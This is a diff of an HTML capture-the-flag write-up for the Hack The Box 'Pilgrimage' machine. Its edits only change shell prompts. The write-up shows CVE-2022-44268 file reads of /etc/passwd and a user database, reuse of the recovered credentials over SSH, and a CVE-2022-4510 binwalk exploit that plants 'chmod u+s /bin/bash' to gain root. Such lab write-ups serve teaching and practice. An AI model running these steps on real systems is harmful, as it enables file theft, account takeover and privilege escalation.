 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>  <span class="mi">1779</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>   <span class="mi">232</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">Dockerfile</span>
@@ -439,7 +439,7 @@ For this, I downloaded a random PNG image from the internet and created the mali
 Now, we have to upload the <code>malicious.png</code> file to the website to exploit the vulnerability.<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/12.png"/><br/><br/>
 Once uploaded, we can use the <code>--url</code> parameter to specify the URL where the converted image is saved and read the file content:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="mi">656621</span><span class="n">fa207ff</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="mi">656621</span><span class="n">fa207ff</span><span class="o">.</span><span class="n">png</span>
 <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
 <span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
@@ -528,7 +528,7 @@ To automate the uploading process, I modified the script:<br/><br/>
 </pre></div>
 
 With this modification, there's no need to use the <code>--url</code> parameter; the upload process is automated. For example, let's attempt to read the <code>/etc/hosts</code> file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/hosts"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/hosts"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">pilgrimage</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span>
 
@@ -539,18 +539,18 @@ With this modification, there's no need to use the <code>--url</code> parameter;
 </pre></div>
 
 This is more comfortable, so let's enumerate the file system. Firstly, I enumerated all potential users on the system:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"sh$"</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"sh$"</span>
 <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="n">emily</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">emily</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">emily</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 </pre></div>
 
 I found the <code>root</code> and <code>emily</code> users with shells, so I attempted to read the <code>id_rsa</code> file of the <code>emily</code> user. If successful, gaining access to the <code>id_rsa</code> file of the <code>emily</code> user could allow us to gain system-level access through the SSH service as <code>emily</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/home/emily/.ssh/id_rsa"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/home/emily/.ssh/id_rsa"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
 </pre></div>
 
 It did not work, so I believe we don't have access to the <code>id_rsa</code> file, or it doesn't exist.<br/><br/>
 After enumerating all interesting files, I recalled the presence of the <code>pilgrimage</code> database, the location of which was leaked in the website source code. I've tried to read its content:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
 <span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
   <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/HTB/Pilgrimage/content/CVE-2022-44268/CVE-2022-44268.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">59</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
     <span class="n">main</span><span class="p">()</span>
@@ -589,15 +589,15 @@ To download this file, I only modified the upload function of the Python script:
 </pre></div>
 
 Now, upon reading this file, we will retrieve the file content in hex format. I will then save the file content into a new file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">&gt;</span> <span class="n">pilgrimage</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">&gt;</span> <span class="n">pilgrimage</span>
 </pre></div>
 
 The file content in hex format has been saved in the <code>pilgrimage</code> file. Now, we need to change its format:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pilgrimage</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">pilgrimage</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pilgrimage</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">pilgrimage</span>
 </pre></div>
 
 Now, when listing the file type of the <code>pilgrimage</code> file, we obtain the following output<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="n">pilgrimage</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="n">pilgrimage</span>
 <span class="n">pilgrimage</span><span class="p">:</span> <span class="n">SQLite</span> <span class="mf">3.</span><span class="n">x</span> <span class="n">database</span><span class="p">,</span> <span class="n">last</span> <span class="n">written</span> <span class="n">using</span> <span class="n">SQLite</span> <span class="n">version</span> <span class="mi">3034001</span><span class="p">,</span> <span class="n">file</span> <span class="n">counter</span> <span class="mi">80</span><span class="p">,</span> <span class="n">database</span> <span class="n">pages</span> <span class="mi">5</span><span class="p">,</span> <span class="n">cookie</span> <span class="mh">0x4</span><span class="p">,</span> <span class="n">schema</span> <span class="mi">4</span><span class="p">,</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">version</span><span class="o">-</span><span class="n">valid</span><span class="o">-</span><span class="k">for</span> <span class="mi">80</span>
 </pre></div>
 
@@ -618,7 +618,7 @@ There is a table called <code>users</code>. Let's extract its entire content:<br
 </pre></div>
 
 These values seem to be credentials for the <code>emily</code> user. Let's try using them to connect through SSH as the <code>emily</code> user:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">emily</span><span class="o">@</span><span class="mf">10.10.11.219</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">emily</span><span class="o">@</span><span class="mf">10.10.11.219</span>
 <span class="n">emily</span><span class="o">@</span><span class="mf">10.10.11.219</span><span class="s1">'s password: </span>
 <span class="n">Linux</span> <span class="n">pilgrimage</span> <span class="mf">5.10.0</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">amd64</span> <span class="c1">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span>
 
@@ -628,27 +628,27 @@ These values seem to be credentials for the <code>emily</code> user. Let's try u
 
 <span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span>
 <span class="n">permitted</span> <span class="n">by</span> <span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 They worked, and we have gained access to the system as the <code>emily</code> user.<br/><br/>
 As emily, we are able to read the first flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
 <span class="mi">8</span><span class="n">fbea</span><span class="o">**********************</span><span class="mi">3</span><span class="n">fa7b</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 The <code>emily</code> user doesn't belong to any interesting group:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 When listing its sudo privileges, we noticed that it doesn't have any.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">emily</span><span class="p">:</span> 
 <span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">emily</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">pilgrimage</span><span class="o">.</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Let's attempt to list the <code>Set-UID</code> files in the file system:<br/><br/>
@@ -670,7 +670,7 @@ Let's attempt to list the <code>Set-UID</code> files in the file system:<br/><br
 
 There are also no interesting <code>Set-UID</code> files.<br/><br/>
 When looking at the commands executed by the users on the system, I found some interesting ones:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">eo</span> <span class="n">user</span><span class="p">,</span><span class="n">command</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"\["</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"systemd"</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">eo</span> <span class="n">user</span><span class="p">,</span><span class="n">command</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"\["</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"systemd"</span>
 <span class="n">USER</span>     <span class="n">COMMAND</span>
 <span class="n">root</span>     <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">init</span>
 <span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">VGAuthService</span>
@@ -694,11 +694,11 @@ When looking at the commands executed by the users on the system, I found some i
 <span class="n">emily</span>    <span class="n">sshd</span><span class="p">:</span> <span class="n">emily</span><span class="nd">@pts</span><span class="o">/</span><span class="mi">0</span>
 <span class="n">emily</span>    <span class="o">-</span><span class="n">bash</span>
 <span class="n">emily</span>    <span class="n">ps</span> <span class="o">-</span><span class="n">eo</span> <span class="n">user</span><span class="p">,</span><span class="n">command</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 The <code>root</code> user, is running a bash script called <code>malwarescan.sh</code>. It is unusual, so let's try to read its content:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">malwarescan</span><span class="o">.</span><span class="n">sh</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">malwarescan</span><span class="o">.</span><span class="n">sh</span>
 <span class="c1">#!/bin/bash</span>
 
 <span class="n">blacklist</span><span class="o">=</span><span class="p">(</span><span class="s2">"Executable script"</span> <span class="s2">"Microsoft executable"</span><span class="p">)</span>
@@ -713,14 +713,14 @@ The <code>root</code> user, is running a bash script called <code>malwarescan.sh
         <span class="n">fi</span>
     <span class="n">done</span>
 <span class="n">done</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 This script is using <code>inotifywait</code> to monitor the directory <code>/var/www/pilgrimage.htb/shrunk/</code> for newly created files. When a file is created, the script gets its full name and uses <code>binwalk</code> to perform a binary signature analysis and extract possible embedded data.<br/><br/>
 The script maintains a blacklist (<code>blacklist</code>) that contains phrases associated with executable scripts and Microsoft executable files. If it finds any of these phrases in the <code>binwalk</code> output, it removes the newly created file. The purpose is to filter and eliminate files that may contain unwanted executables or data.<br/><br/>
 <h3><br>Shell as root</br></h3><br>
 Let's list the version of the <code>binwalk</code> binary:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">binwalk</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">binwalk</span>
 
 <span class="n">Binwalk</span> <span class="n">v2</span><span class="mf">.3.2</span>
 <span class="n">Craig</span> <span class="n">Heffner</span><span class="p">,</span> <span class="n">ReFirmLabs</span>
@@ -748,7 +748,7 @@ Let's list the version of the <code>binwalk</code> binary:<br/><br/>
     <span class="o">-</span><span class="n">p</span><span class="p">,</span> <span class="o">--</span><span class="n">fexclude</span><span class="o">=&lt;</span><span class="nb">str</span><span class="o">&gt;</span>         <span class="n">Do</span> <span class="ow">not</span> <span class="n">scan</span> <span class="n">files</span> <span class="n">whose</span> <span class="n">names</span> <span class="n">match</span> <span class="n">this</span> <span class="n">regex</span>
     <span class="o">-</span><span class="n">s</span><span class="p">,</span> <span class="o">--</span><span class="n">status</span><span class="o">=&lt;</span><span class="nb">int</span><span class="o">&gt;</span>           <span class="n">Enable</span> <span class="n">the</span> <span class="n">status</span> <span class="n">server</span> <span class="n">on</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">port</span>
 
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 This script is using version <code>2.3.2</code> of <code>binwalk</code>. Let's search for information about vulnerabilities associated with this version.<br/><br/>
@@ -761,7 +761,7 @@ After searching for information on the internet, I found a <a href="https://gith
 This exploit generates a malicious <code>.png</code> file which will allow us to execute commands as root, since root is executing <code>binwalk</code>.<br/><br/>
 To exploit this vulnerability, we need to determine the location where the root user is applying <code>binwalk</code>. This information is leaked in the <code>malwarescan.sh</code> script, as we've already seen. Therefore, when the malicious file is created, we need to copy it to the <code>/var/www/pilgrimage.htb/shrunk/</code> directory.<br/><br/>
 First, I uploaded the <a href="https://raw.githubusercontent.com/adhikara13/CVE-2022-4510-WalkingPath/main/walkingpath.py">walkingpath.py</a> script to the victim machine:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> 
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> 
 <span class="n">usage</span><span class="p">:</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">{</span><span class="n">ssh</span><span class="p">,</span><span class="n">command</span><span class="p">,</span><span class="n">reverse</span><span class="p">}</span> <span class="o">...</span>
 
 <span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span>
@@ -769,36 +769,36 @@ First, I uploaded the <a href="https://raw.githubusercontent.com/adhikara13/CVE-
 
 <span class="n">optional</span> <span class="n">arguments</span><span class="p">:</span>
   <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 I also uploaded a PNG image, as it is needed to create the malicious file. Now, let's use the <code>command</code> module to create a malicious file. We will attempt to make the root user execute the <code>chmod u+s /bin/bash</code> command. If the <code>root</code> user successfully executes this command, the <code>/bin/bash</code> will become <code>Set-UID</code>, allowing us to use the <code>bash -p</code> command and gain command execution as the <code>root</code> user.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> <span class="n">command</span> <span class="o">--</span><span class="n">command</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">./</span><span class="n">image</span><span class="o">.</span><span class="n">png</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> <span class="n">command</span> <span class="o">--</span><span class="n">command</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">./</span><span class="n">image</span><span class="o">.</span><span class="n">png</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 The <code>binwalk_exploit.png</code> was successfully created. This image will be used in the attempt to exploit the vulnerability and gain command execution as the root user.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
 <span class="n">total</span> <span class="mi">1016</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span> <span class="mi">514272</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">12</span> <span class="n">binwalk_exploit</span><span class="o">.</span><span class="n">png</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span> <span class="mi">513590</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">11</span> <span class="n">image</span><span class="o">.</span><span class="n">png</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">emily</span>     <span class="mi">33</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">22</span><span class="p">:</span><span class="mi">25</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span>   <span class="mi">3391</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">02</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Now, we need to copy the <code>binwalk_exploit.png</code> image to the <code>/var/www/pilgrimage.htb/shrunk/</code> directory:<br/><br/>
